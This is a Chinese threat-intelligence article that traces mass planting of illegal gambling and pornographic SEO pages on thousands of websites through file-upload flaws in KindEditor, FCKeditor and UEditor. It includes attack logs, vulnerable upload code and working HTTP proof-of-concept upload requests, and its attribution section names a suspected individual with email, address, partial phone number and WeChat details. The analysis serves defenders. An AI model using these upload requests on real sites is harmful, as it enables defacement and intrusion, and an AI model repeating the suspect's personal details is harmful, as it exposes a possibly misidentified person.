# 溯源黑帽利用 Web 编辑器漏洞非法植入 SEO 页面事件

阅读量 **264695**

|评论 **4**

发布时间 : 2020-07-17 15:00:55

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t017082c9586dacd851.png)

**作者：SanLorewalker@知道创宇404积极防御实验室**

## 一、背景

知道创宇威胁情报中心-业务安全舆情监测平台不断发现大量网站被植入非法SEO内容页面，且最近有明显上升的现象，2020年4月至6月发现了6,802个网站被植入了4,955,586个非法SEO内容页面，知道创宇404积极防御实验室的安全研究员针对该现象了进行了分析、溯源。

被非法植入SEO页面的域名备案省份分布如下：

![](https://p4.ssl.qhimg.com/t012b7eb1c103271ce5.gif)

图 1 非法植入SEO页面省份分布图

其中，企业占了67%；政府机关、事业单位等国家机构占比4%，如下图：

![](https://p2.ssl.qhimg.com/t017416d6c8f444be69.gif)

图 2 网站性质分布比例图

被植入非法SEO页面的存活统计如下：

![](https://p2.ssl.qhimg.com/t016c40b6c57718bab2.gif)

图 3 非法SEO页面存活比例图

## 二、详细分析

访问这些被植入的页面会自动跳转到博彩网站、色情网站。这些页面通过嵌入大量暗链、伪装成404错误页面、写入到PDF文件内容中等多种方法来提高在搜索引擎中的排名。

###  1\. 非法SEO页面植入案例

被植入的非法SEO页面有如下几种：

![](https://p2.ssl.qhimg.com/t013d24f27efbeb49bf.png)

图 4 访问页面后跳转到博彩网站

![](https://p0.ssl.qhimg.com/t01939381d00a71984a.png)

图 5 页面内包含大量色情信息以及暗链

![](https://p2.ssl.qhimg.com/t01d0c3908333dd2283.png)

图 6 页面内包大量暗链以及非法捏造新闻内容

![](https://p0.ssl.qhimg.com/t01b87183bfdf0275e7.png)

图 7 非法植入传奇页面

![](https://p4.ssl.qhimg.com/t01735542b36fdc0aa0.png)

图 8 在html头部隐藏植入博彩信息和页面跳转脚本

![](https://p1.ssl.qhimg.com/t016d5ba4df8c6aef97.png)

图 9 404页面伪装

![](https://p3.ssl.qhimg.com/t015b1260d4a17ba821.png)

图 10 直接植入博彩页面

![](https://p2.ssl.qhimg.com/t01dcc7242050e0a3b4.png)

图 11 将博彩信息植入PDF文件内

![](https://p0.ssl.qhimg.com/t010e46149ea4bad4e3.png)

图 12 搜狗页面隐藏色情页面内容

### 2\. 日志分析

经分析，发现这些网站大部分使用了KindEditor、UEditor和FCKeditor。KindEditor和UEditor在默认配置的情况下允许访客上传文件，FCKeditor在配置不当的情况下会导致访客任意上传文件。

对使用KindEditor的网站日志分析，政府机构、教育机构、事业单位、企业等网站都存在异常数据流量，其特征都是访问不同网站的同一个目录文件：  
`www.*.com/kindeditor/*/upload_json.ashx?dir=image`

以KindEditor为关键字，在谷歌搜索上找到大量的被非法注入的SEO内容的页面：

![](https://p5.ssl.qhimg.com/t01dceab289f196d7d9.png)

图 13

知道创宇云安全CDN捕获到黑客的上传请求：

    
    
    2020-06-28 16:53:49    180.104.*.*    POST    www.*.com/e/incs/kindeditor/ashx/upload_json.ashx?dir=image
    2020-06-28 17:00:20    106.115.*.*    POST    www.*.com/kindeditor/asp.net/upload_json.ashx?dir=file
    2020-06-28 16:59:58    106.115.*.*    POST    www.*.com/kindeditor/asp.net/upload_json.ashx?dir=file
    2020-06-28 17:00:07    106.115.*.*    POST    www.*.com/kindeditor/asp.net/upload_json.ashx?dir=file
    2020-06-28 16:59:26    106.115.*.*    POST    www.*.com/kindeditor/asp.net/upload_json.ashx?dir=file
    2020-06-28 16:59:48    106.115.*.*    POST    www.*.com/kindeditor/asp.net/upload_json.ashx?dir=file
    2020-06-28 16:59:52    106.115.*.*    POST    www.*.com/kindeditor/asp.net/upload_json.ashx?dir=file
    2020-06-28 16:55:11    180.104.*.*    POST    www.*.com/e/incs/kindeditor/ashx/upload_json.ashx?dir=image
    2020-06-28 16:55:30    180.104.*.*    POST    www.*.com/e/incs/kindeditor/ashx/upload_json.ashx?dir=image
    2020-06-28 16:58:22    58.216.*.*    POST    www.*.gov.cn/editor/kindeditor/php/upload_json.php?dir=image
    2020-06-28 17:24:25    58.216.*.*    POST    www.*.gov.cn/editor/kindeditor/php/upload_json.php?dir=image
    2020-06-28 17:00:13    106.115.*.*    POST    www.*.com/kindeditor/asp.net/upload_json.ashx?dir=file
    2020-06-28 16:59:45    106.115.*.*    POST    www.*.com/kindeditor/asp.net/upload_json.ashx?dir=file
    2020-06-28 17:00:24    106.115.*.*    POST    www.*.com/kindeditor/asp.net/upload_json.ashx?dir=file
    2020-06-28 16:59:32    106.115.*.*    POST    www.*.com/kindeditor/asp.net/upload_json.ashx?dir=file
    2020-06-28 16:48:53    45.89.*.*    POST    jtj.*.gov.cn/js/kindeditor/jsp/upload_json.jsp?dir=file
    2020-06-28 16:59:27    106.115.*.*    POST    www.*.com/kindeditor/asp.net/upload_json.ashx?dir=file
    2020-06-28 17:00:04    106.115.*.*    POST    www.*.com/kindeditor/asp.net/upload_json.ashx?dir=file
    2020-06-28 16:54:57    223.113.*.*    POST    b2b.*.cn/member/kindeditor/php/upload_json.php?dir=image
    2020-06-28 16:44:40    27.38.*.*    POST    b2b.*.cn/member/kindeditor/php/upload_json.php?dir=image
    2020-06-28 16:44:24    27.38.*.*    POST    b2b.*.cn/member/kindeditor/php/upload_json.php?dir=image
    2020-06-28 16:55:16    223.113.*.*    POST    b2b.*.cn/member/kindeditor/php/upload_json.php?dir=image
    2020-06-28 16:55:32    223.113.*.*    POST    b2b.*.cn/member/kindeditor/php/upload_json.php?dir=image
    2020-06-28 16:55:50    223.113.*.*    POST    b2b.*.cn/member/kindeditor/php/upload_json.php?dir=image
    

经过统计，80%的非法植入页面都与KindEditor编辑器有关，并且 KindEditor编辑器的版本号都小于4.1.12。

###  3\. 编辑器漏洞分析

**3.1 影响范围**

知道创宇ZoomEye检索到KindEditor编辑器相关记录 29,595条、FCKeditor编辑器记录238,711条、UEditor编辑器记录
18,648条，如下所示：

![](https://p4.ssl.qhimg.com/t01b371ca1aa9777b2d.png)

图 14 KindEditor编辑器

![](https://p0.ssl.qhimg.com/t01709bbc02aa2c566b.png)

图 15 FCKeditor编辑器

![](https://p2.ssl.qhimg.com/t019ffd578f6f216350.png)

图 16 UEditor编辑器

使用ZoomEye网络搜索引擎快速评估了三种编辑器漏洞的影响范围，其中UEditor主要省市分布如下：

![](https://p0.ssl.qhimg.com/t01678dbcb426662cff.png)

FCKeditor主要省市分布如下：

![](https://p3.ssl.qhimg.com/t017542d77e499421b1.png)

KindEditor主要省市分布如下：

![](https://p2.ssl.qhimg.com/t01ee43417c10b2c20c.png)

**3.2 KindEditor 编辑器文件上传漏洞分析**

KindEditor < 4.1.12
版本存在任意文件上传漏洞，文件`KindEditor/php/upload_json.php`是演示程序，不检查访问者的权限以及内容即可上传文件，且很多网站系统没有删除该文件，造成恶意用户上传非法内容。`upload_json.php`关键代码如下所示：

    
    
    /有上传文件时
    if (empty($_FILES) === false) {
        //原文件名
        $file_name = $_FILES['imgFile']['name'];
        //服务器上临时文件名
        $tmp_name = $_FILES['imgFile']['tmp_name'];
        //文件大小
        $file_size = $_FILES['imgFile']['size'];
        //检查文件名
        if (!$file_name) {
            alert("请选择文件。");
        }
        //检查目录
        if (@is_dir($save_path) === false) {
            alert("上传目录不存在。");
        }
        //检查目录写权限
        if (@is_writable($save_path) === false) {
            alert("上传目录没有写权限。");
        }
        //检查是否已上传
        if (@is_uploaded_file($tmp_name) === false) {
            alert("上传失败。");
        }
        //检查文件大小
        if ($file_size > $max_size) {
            alert("上传文件大小超过限制。");
        }
        //检查目录名
        $dir_name = empty($_GET['dir']) ? 'image' : trim($_GET['dir']);
        if (empty($ext_arr[$dir_name])) {
            alert("目录名不正确。");
        }
        //获得文件扩展名
        $temp_arr = explode(".", $file_name);
        $file_ext = array_pop($temp_arr);
        $file_ext = trim($file_ext);
        $file_ext = strtolower($file_ext);
        //检查扩展名
        if (in_array($file_ext, $ext_arr[$dir_name]) === false) {
            alert("上传文件扩展名是不允许的扩展名。\n只允许" . implode(",", $ext_arr[$dir_name]) . "格式。");
        }
        //创建文件夹
        if ($dir_name !== '') {
            $save_path .= $dir_name . "/";
            $save_url .= $dir_name . "/";
            if (!file_exists($save_path)) {
                mkdir($save_path);
            }
        }
        $ymd = date("Ymd");
        $save_path .= $ymd . "/";
        $save_url .= $ymd . "/";
        if (!file_exists($save_path)) {
            mkdir($save_path);
        }
        //新文件名
        $new_file_name = date("YmdHis") . '_' . rand(10000, 99999) . '.' . $file_ext;
        //移动文件
        $file_path = $save_path . $new_file_name;
        if (move_uploaded_file($tmp_name, $file_path) === false) {
            alert("上传文件失败。");
        }
        @chmod($file_path, 0644);
        $file_url = $save_url . $new_file_name;
    
        header('Content-type: text/html; charset=UTF-8');
        $json = new Services_JSON();
        echo $json->encode(array('error' => 0, 'url' => $file_url));
        exit;
    }

POC如下:

    
    
    POST /asp/upload_json.asp?dir=file HTTP/1.1
    Host: www.*.com
    User-Agent: curl/7.64.1
    Accept: */*
    Content-Length: 80432
    Content-Type: multipart/form-data; boundary=------------------------9f9be5bc74ffdc89
    Expect: 100-continue
    
    HTTP/1.1 200 OK
    Date: Thu, 09 Jul 2020 05:26:25 GMT
    Content-Type: text/html; charset=UTF-8
    Content-Length: 85
    Connection: keep-alive
    Cache-Control: private
    Set-Cookie: ASPSESSIONIDSCQCSSTQ=HCFCPMPCKGEKEBLLNIBOJOBL; path=/
    X-Via-JSL: 9f68ad3,-    Set-Cookie: __jsluid_h=735a5857c6600e858cbf1e17cbf444f3; max-age=31536000; path=/; HttpOnly
    X-Cache: bypass
    
    {"error":0,"url":"\/asp\/..\/company\/upimages\/20200709\/20200709132665736573.html"}

### 3.3 FCKeditor 编辑器文件上传漏洞分析

PHP 版本 <= 2.4.2 在处理PHP 上传的地方并未对用户进行上传文件类型的控制，导致用户上传任意文件。

通过测试分析，发现上传文件的接口：

    
    
    www.*.com/gedo/mambots/editors/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/

关键参数有：Command、Type和CurrentFolder。

首先在源码中，查找Command、Type和CurrentFolder三个参数相关的代码：

    
    
        $sCommand       = $_GET['Command'] ;
        $sResourceType  = $_GET['Type'] ;
        $sCurrentFolder = $_GET['CurrentFolder'] ;

sCommand变量，当该变量值为“FileUpload”时，会通过FileUpload函数处理：

    
    
        if ( $sCommand == 'FileUpload' )
        {
            FileUpload( $sResourceType, $sCurrentFolder ) ;
            return ;
        }

FileUpload（位于commands.php）只是简单的对文件后缀名做了黑名单限制：

    
    
    $arDenied   = $Config['DeniedExtensions'][$resourceType] ;

未对非法内容进行过滤，也没有进行权限限制，就可以利用这一点进行非法SEO内容上传。

POC如下：

    
    
    POST /gedo/mambots/editors/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/ HTTP/1.1
    Host: www.*.com
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=---------------------------29373750073747171394011132748
    Content-Length: 325
    Origin: http://www.*.com
    Connection: close
    Referer: http://www.*.com/gedo/mambots/editors/fckeditor/editor/filemanager/browser/default/frmupload.html
    Upgrade-Insecure-Requests: 1
    
    -----------------------------29373750073747171394011132748
    Content-Disposition: form-data; name="NewFile"; filename="testtest.html"
    Content-Type: text/html
    
    <!DOCTYPE html>
    <html>
    <head>
        <title>test title</title>
    </head>
    <body>
    <p>girl<p>
    </body>
    </html>
    -----------------------------29373750073747171394011132748--    
    
    
    
    HTTP/1.1 200 OK
    Date: Fri, 10 Jul 2020 02:18:42 GMT
    Server: Apache
    Connection: close
    Content-Type: text/html
    Content-Length: 112
    
    <script type="text/javascript">window.parent.frames["frmUpload"].OnUploadCompleted(0,"testtest.html") ;</script>

### 3.4 UEditor 编辑器文件上传漏洞分析

UEditor 1.4.3.3
的.NET语言版本存在任意文件上传漏洞。因为编辑器上传接口暴露：`/ueditor/net/controller.ashx?action=catchimage`，网站开发人员未对其进行安全设置，造成任意文件上传漏洞。

在UEditor 中有一个上传逻辑部分的controller.php文件，如下所示：

    
    
    date_default_timezone_set("Asia/chongqing");
    error_reporting(E_ERROR);
    header("Content-Type: text/html; charset=utf-8");
    $CONFIG = json_decode(preg_replace("/\/*[\s\S]+?*\//", "", file_get_contents("config.json")), true);
    $action = $_GET['action'];
    switch ($action) {
        case 'config':
            $result =  json_encode($CONFIG);
            break;
        / 上传图片 /
        case 'uploadimage':
        / 上传涂鸦 /
        case 'uploadscrawl':
        / 上传视频 /
        case 'uploadvideo':
        / 上传文件 /
        case 'uploadfile':
            $result = include("action_upload.php");
            break;
        / 列出图片 /
        case 'listimage':
            $result = include("action_list.php");
            break;
        / 列出文件 /
        case 'listfile':
            $result = include("action_list.php");
            break;
        / 抓取远程文件 /
        case 'catchimage':
            $result = include("action_crawler.php");
            break;
        default:
            $result = json_encode(array(
                'state'=> '请求地址出错'
            ));
            break;
    }

每当抓取远程数据源时，都会进入“catchimage”分支，而Crawler方法对source[]的检查仅仅是一个ContentType：

    
    
    if (response.ContentType.IndexOf("image") == -1)
                {
                    State = "Url is not an image";
                    return this;
                }

因此，恶意用户就可以通过构造以下代码上传任意文件，POC如下所示:

    
    
    POST /ueditor/net/controller.ashx?action=catchimage HTTP/1.1
    Host: www.*.com
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 41
    Connection: close
    Upgrade-Insecure-Requests: 1
    
    source%5B%5D=http%3A%2F%2Fwww.*.com
    
    HTTP/1.1 200 OK
    Cache-Control: private
    Content-Type: text/plain; charset=utf-8
    Server: Microsoft-IIS/7.5
    X-AspNet-Version: 4.0.30319
    X-Powered-By: ASP.NET
    Access-Control-Allow-Origin: *
    Access-Control-Allow-Headers: Content-Type
    Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
    Date: Thu, 09 Jul 2020 06:38:58 GMT
    Connection: close
    Content-Length: 105
    
    {"state":"SUCCESS","list":[{"state":"Url is not an image","source":"http://www.*.com","url":null}]}

## 4\. IP分析

从知道创宇云安全CDN数据中抽取6月28日的日志记录，统计因编辑器漏洞导致上传次数大于10次的异常IP：

IP | 地理位置 | 上传次数  
---|---|---  
106.115.x.x | 河北 | 96  
80.251.x.x | 美国 | 90  
104.233.x.x | 日本 | 30  
58.216.x.x | 江苏 | 30  
112.53.x.x | 江苏 | 24  
218.4.x.x | 江苏 | 13  
119.180.x.x | 山东 | 10  
  
抽取了一个6月活跃的IP，节选的片段如下所示：

`2020-06-28 16:11:18 58.216.*.* jggw.*.gov.cn
/api.php?op=upload_json&dir=image  
2020-06-28 11:40:12 58.216.*.* zx.*.gov.cn /api.php?op=upload_json&dir=image  
2020-06-28 15:48:56 58.216.*.* ql.*.org.cn /api.php?op=upload_json&dir=image  
2020-06-28 15:49:11 58.216.*.* ql.*.org.cn /api.php?op=upload_json&dir=image  
2020-06-28 17:04:47 58.216.*.* jyj.*.gov.cn /api.php?op=upload_json&dir=file  
2020-06-28 11:04:33 58.216.*.* ciip.*.gov.cn /api.php?op=upload_json&dir=image  
2020-06-28 11:37:09 58.216.*.* zx.*.gov.cn /api.php?op=upload_json&dir=image  
2020-06-28 11:37:13 58.216.*.* zx.*.gov.cn /api.php?op=upload_json&dir=image  
2020-06-28 11:37:17 58.216.*.* zx.*.gov.cn /api.php?op=upload_json&dir=image  
2020-06-28 11:37:20 58.216.*.* zx.*.gov.cn /api.php?op=upload_json&dir=image
2020-06-28 16:30:20 58.216.*.* www.*.gov.cn
/editor/kindeditor/php/upload_json.php?dir=image  
2020-06-28 16:31:17 58.216.*.* www.*.gov.cn
/editor/kindeditor/php/upload_json.php?dir=image  
2020-06-28 16:39:01 58.216.*.* www.*.gov.cn
/editor/kindeditor/php/upload_json.php?dir=image  
2020-06-28 16:39:12 58.216.*.* www.*.gov.cn
/editor/kindeditor/php/upload_json.php?dir=image  
2020-06-28 12:08:24 58.216.*.* jyj.*.gov.cn /api.php?op=upload_json&dir=image  
2020-06-28 12:08:36 58.216.*.* jyj.*.gov.cn /api.php?op=upload_json&dir=image  
2020-06-28 16:49:55 58.216.*.* gxj.*.gov.cn /api.php?op=upload_json&dir=file  
2020-06-28 16:51:03 58.216.*.* zfhcxjsj.*.gov.cn
/api.php?op=upload_json&dir=image  
2020-06-28 16:51:10 58.216.*.* zfhcxjsj.*.gov.cn
/api.php?op=upload_json&dir=image  
2020-06-28 16:51:18 58.216.*.* zfhcxjsj.*.gov.cn
/api.php?op=upload_json&dir=image`

有着相同的规律：每5秒到10秒就发送一次POST非法SEO页面请求，且该IP在三天内没有一次访问过受害网站，因此可以判断黑客利用非法工具对网站进行了批量上传页面操作。

## 5\. 黑客溯源

经分析，这些网站都有共同存在的暗链：

链接 | 描述  
---|---  
[www.ikaidian.net/css.js](www.ikaidian.net/css.js) | 恶意伪造虚假八卦消息的网站  
[www.htmljpg.com](www.htmljpg.com) | 外表小说网站其实暗链综合网站  
[www.113112.xyz](www.113112.xyz) | 存储大量色情图片的网站  
  
www.ikaidian.net/css.js 截图如下：

![](https://p1.ssl.qhimg.com/t01efcc2d636e6ed8e2.png)

图 17

www.ikaidian.net/404.js的内容截图如下：

![](https://p2.ssl.qhimg.com/t01ab56dc9c6c998dd5.png)

图 18

继续打开，里面藏着一个账号：E-mail:[fa885168@gmail.com](mailto:fa885168@gmail.com)

![](https://p0.ssl.qhimg.com/t010432a4265d4d9c3f.png)

图 19

用谷歌搜索，所有结果都是色情页面，布局格式和上文找到植入非法SEO内容一致：

![](https://p4.ssl.qhimg.com/t01a393daf6488e2976.png)

图 20

必应搜索结果如下所示：

![](https://p0.ssl.qhimg.com/t01f693fcbe6acf5a63.png)

图 21

点进网页，搜索源码，发现一段有效信息：

![](https://p5.ssl.qhimg.com/t013a2d0466d46507f3.png)

图 22

有效信息如下：

`Name: facai chen  
Street: guangdongshengzhongshanshizhongshanjie  
Postal Code: 528400  
Phone: +86.1317****648  
Email: [fa885168@gmail.com](mailto:fa885168@gmail.com)`

邮编与街道相符，手机号为山东滨州联通的电话号码。

微信查找手机号，疑似黑客的微信：

![](https://p0.ssl.qhimg.com/t017e9a0c9fd84521f1.png)

图 23

微信头像疑似为本人照片：

![](https://p2.ssl.qhimg.com/t010ae9e29c4dfb0ced.png)

图 24

根据追溯结果显示，该漏洞已被国内黑产人员大批量自动化利用。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **知道创宇404实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/210985](/post/id/210985)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)

 **+1** __2赞

 __收藏

![](https://p0.ssl.qhimg.com/t016a18426d2b84e450.png) 知道创宇404实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

